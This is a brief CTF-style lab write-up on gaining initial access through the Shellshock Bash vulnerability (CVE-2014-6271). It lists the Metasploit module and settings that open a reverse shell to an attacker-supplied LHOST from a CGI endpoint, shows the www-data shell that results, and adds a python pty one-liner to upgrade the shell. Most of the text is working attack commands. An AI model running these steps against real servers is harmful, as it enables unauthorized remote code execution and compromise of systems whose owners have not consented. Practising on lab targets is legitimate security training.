# 💥 Initial Access - Shellshock

### Why Shellshock Matters

Shellshock (CVE-2014-6271) is a Bash vulnerability allowing attackers to execute commands through specially crafted environment variables.

If a CGI script passes user-controlled data into Bash:

💀 Remote Code Execution.

---

## Exploitation

Metasploit made quick work of it.

```bash
use exploit/multi/http/apache_mod_cgi_bash_env_exec

set RHOSTS 10.49.181.37
set TARGETURI /cgi-bin/test.cgi
set LHOST YOUR_IP

exploit
```

### Shell Obtained

```bash
uid=33(www-data)
```

Shell upgraded:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

